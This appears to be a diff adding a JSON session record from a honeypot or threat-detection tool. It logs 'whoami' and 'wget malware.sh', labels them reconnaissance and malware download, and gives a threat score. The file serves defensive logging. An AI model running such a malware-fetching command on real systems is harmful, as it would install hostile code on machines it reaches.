@@ -1,0 +1,28 @@
+{
+    "session_id": "d7f58155-bd9f-475e-a767-860035973cb5",
+    "ip": "127.0.0.1",
+    "start_time": "2026-07-13T16:08:19.802978",
+    "end_time": "2026-07-13T16:58:46.471895",
+    "current_directory": "/home/ubuntu",
+    "commands": [
+        {
+            "command": "whoami",
+            "timestamp": "2026-07-13T16:08:22.360172",
+            "cwd": "/home/ubuntu"
+        },
+        {
+            "command": "wget malware.sh",
+            "timestamp": "2026-07-13T16:08:39.404283",
+            "cwd": "/home/ubuntu"
+        }
+    ],
+    "threat_score": 110,
+    "attack_types": [
+        "Reconnaissance",
+        "Malware Download"
+    ],
+    "attacker_profile": {
+        "intent": "malware"
+    },
+    "session_duration": "0:50:26.668917"
+}
